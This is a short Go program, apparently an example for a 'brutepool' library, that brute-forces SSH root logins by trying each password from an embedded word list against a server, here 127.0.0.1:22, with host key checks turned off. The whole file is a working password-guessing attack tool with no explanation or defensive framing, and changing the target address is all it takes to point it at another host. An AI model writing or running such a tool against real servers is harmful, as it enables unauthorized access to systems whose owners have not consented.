package main

import (
	_ "embed"
	"fmt"
	"github.com/hanbufei/brutepool"
	"golang.org/x/crypto/ssh"
	"net"
	"strings"
)

//go:embed testpass
var pass string

func TrySSHLogin(passwd interface{}) bool {
	user := "root"
	addr := "127.0.0.1:22"
	fmt.Println(">" + passwd.(string))
	sshConfig := &ssh.ClientConfig{
		User:            user,
		Auth:            []ssh.AuthMethod{ssh.Password(passwd.(string))},
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
	}

	var dialer net.Dialer
	conn, err := dialer.Dial("tcp", addr)
	if err != nil {
		return false
	}
	defer conn.Close()

	client, _, _, err := ssh.NewClientConn(conn, addr, sshConfig)
	if err == nil {
		client.Close()
		return true
	}
	return false
}

func main() {
	passList := strings.Split(pass, "\n")
	bruteList := make([]interface{}, len(passList), len(passList))
	for i := range passList {
		bruteList[i] = passList[i]
	}
	p := brutepool.New(bruteList, TrySSHLogin)
	p.Run()
}
